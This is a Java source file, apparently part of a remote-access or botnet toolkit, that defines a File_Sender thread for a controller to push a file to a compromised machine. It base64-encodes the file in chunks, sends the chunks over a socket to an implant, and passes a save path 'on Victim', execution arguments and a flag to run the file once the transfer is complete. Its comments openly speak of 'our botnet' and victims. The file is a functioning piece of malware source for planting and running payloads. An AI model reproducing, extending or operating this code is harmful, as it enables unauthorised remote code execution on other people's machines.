/**
 * this thread is meant to send a file across a socket, base encoded, to the receiver
 * 
 * @author Solomon Sonya
 */

package Implant.FTP.Encoded_File_Transfer;


import java.io.*;

import Controller.Thread.Thread_ServerSocket;
import Controller.Thread.Thread_Terminal;
import Dialogs.Dialog_File_Or_Payload_Upload;
import Implant.Driver;

public class File_Sender extends Thread implements Runnable
{
	public static final String myClassName = "File_Sender";
	Thread_Terminal parent = null;
	File fleToTransfer = null;
	String executionArguments = null;
	String saveDirectoryOnTarget = "";
	String saveFileName = "";
	boolean executeFileWhenComplete = true;
	String executionCommand = "";
	String execution_preamble = "";
	String target_IP = "";
	
	
	public File_Sender(Thread_Terminal par, File fle, String saveDirectoryOnVictim, String saveFleName, String args, String executionCmd, boolean executeFileWhenTransferComplete, String executionPreamble, String targetIP)
	{
		try
		{
			parent = par;
			fleToTransfer = fle;
			executionArguments = args;
			saveDirectoryOnTarget = saveDirectoryOnVictim; 
			saveFileName = saveFleName;
			executeFileWhenComplete = executeFileWhenTransferComplete;
			executionCommand = executionCmd;
			this.execution_preamble = executionPreamble;
			this.target_IP = targetIP;
			
			if(parent != null && fleToTransfer != null && executionArguments != null)
			{
				this.start();
			}
			else
			{
				Driver.sop("Invalid file parameters. Unable to transfer file!!!");
			}
			
			
			
		
		}
		catch(Exception e)
		{
			Driver.eop("Constructor", myClassName, e, "", false);
		}
	}
	
	public void run()
	{
		try
		{
			transferFile(parent, fleToTransfer, executionArguments, saveDirectoryOnTarget, saveFileName, executionCommand, executeFileWhenComplete);						
		}
		catch(Exception e)
		{
			Driver.eop("run", myClassName, e, "", false);
		}
	}
	
														                                                                
	public boolean transferFile(Thread_Terminal terminal, File fleToTx, String argsv, String saveDirectory_on_Target, String saveFleName, String full_execution_cmd, boolean execute_file_when_complete)
	{
		try
		{
			
			//read from this file and write to disk
			InputStream isIn = new FileInputStream(fleToTx);
			String base64encoded_chunk = null;
			
			int bufferSize = 1024;
			int totalBytesWritten = 0;
			byte[] buffer = new byte[bufferSize];
			int bytesReadFromBuffer;
			
			byte [] actualBytesToEncode = null;
			
			//note, we use this sender's thread id as the unique identifier for the file we are transferring
			//although in a distributed system as our botnet, this is not enough to guarantee uniqueness, it is unique 
			//enough bcs remember, each of these threads pertain to an individual thread listener instance on the Receiver's side
			//therefore, even if there are many of the same thread id's used across the botnet, since the sender never repeats
			//a thread id, and since all communications for each agent is handled in a separate thread on the receiver's side, 
			//this is perfectly acceptable to identify each file transfer stream
			
			//NOTIFY WHICH FILE WE'RE SENDING
																																																																		
			parent.sendCommand_RAW(Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 + ""+ Driver.SERVICE_REQUEST_I_AM_SENDING_THIS_FILE + Driver.delimeter_1 + " " + this.getId() + " " + Driver.delimiter_FILE_MIGRATION + fleToTx.getCanonicalPath() + " " + Driver.delimiter_FILE_MIGRATION + " " + saveFleName + Driver.delimiter_FILE_MIGRATION + " " + argsv + Driver.delimiter_FILE_MIGRATION + " " + saveDirectory_on_Target + Driver.delimiter_FILE_MIGRATION + " " + full_execution_cmd + Driver.delimiter_FILE_MIGRATION + " " + execute_file_when_complete + Driver.delimiter_FILE_MIGRATION + " " + this.execution_preamble);
			 
			//introduce temporary delay!!!
			//this is crucial to have the arraylists set up correctly. otherwise, we'll encounter a race condition and never save everything!!!
			Driver.jop_Warning("File Transfer Initiated Successfully to " + target_IP, "Commencing Transfer");
			Driver.sop("Commencing File Transfer!!!");
			
			//all lines received are from the connected agent sending feedback to the controller
			//try	{	Driver.logReceivedLine(true, this.getId(), " " + parent.myRandomIdentifier + " ", " " + parent.myImplantName + " ", " SPLINTER - CONTROLER ", " " + this.myVictim_RHOST_IP + " ", " " + Thread_ServerSocket.ControllerIP + " ", inputLine);	} catch(Exception ee){}
			
			
			//read in byte chunk
			while ((bytesReadFromBuffer = isIn.read(buffer, 0, bufferSize)) > 0) 
			{
				//update number of bytes read
				totalBytesWritten += bytesReadFromBuffer;
				
				//grab actual array of read bytes with no null spaces
				actualBytesToEncode = new byte [bytesReadFromBuffer];
				
				//copy bytes read into byte buffer to encode
				//this step is crucial because the last read of the file is not always a full 1024 bytes, 
				//thus to prevent encoding null bytes, only encode the actual bytes in the buffer
				for(int i = 0; i < actualBytesToEncode.length; i++)
				{
					actualBytesToEncode[i] = buffer[i];
				}
				
				//convert byte chunk to base64encoded string								
				base64encoded_chunk = Driver.getBase64EncodedText_From_ByteArray(actualBytesToEncode);
				
				//send base64encoded chunk of socket to recipient
				terminal.sendCommand_RAW(Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 + Driver.SERVICE_RESPONSE_STORE_FILE_BYTE_CHUNK + Driver.delimeter_1 + " " + this.getId() + Driver.delimiter_FILE_MIGRATION + base64encoded_chunk + Driver.delimiter_FILE_MIGRATION + fleToTx.getCanonicalPath());
			}
			
			//finished transferring full file, alert receiver transfer complete
			terminal.sendCommand_RAW(Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 + ""+Driver.SERVICE_RESPONSE_I_AM_FINISHED_SENDING_FILE + Driver.delimeter_1 + " " + this.getId() + " " + Driver.delimiter_FILE_MIGRATION + fleToTx.getCanonicalPath() + " " + Driver.delimiter_FILE_MIGRATION + " " + saveFleName + " " + Driver.delimiter_FILE_MIGRATION + " " + argsv + Driver.delimiter_FILE_MIGRATION + " " + saveDirectory_on_Target + Driver.delimiter_FILE_MIGRATION + " " + full_execution_cmd + Driver.delimiter_FILE_MIGRATION + " " + execute_file_when_complete + Driver.delimiter_FILE_MIGRATION + " " + this.execution_preamble);
																																									
			//done writing the file, close the streams!
			isIn.close();
			
			Driver.sop("Finished sending file: " + fleToTx + " to recipient.  Total bytes sent: " + totalBytesWritten);			
			
			
			return true;
		}
		catch(Exception e)
		{
			Driver.eop("transferFile", myClassName, e, "", false);
			
		}
		
		return false;
	}
}
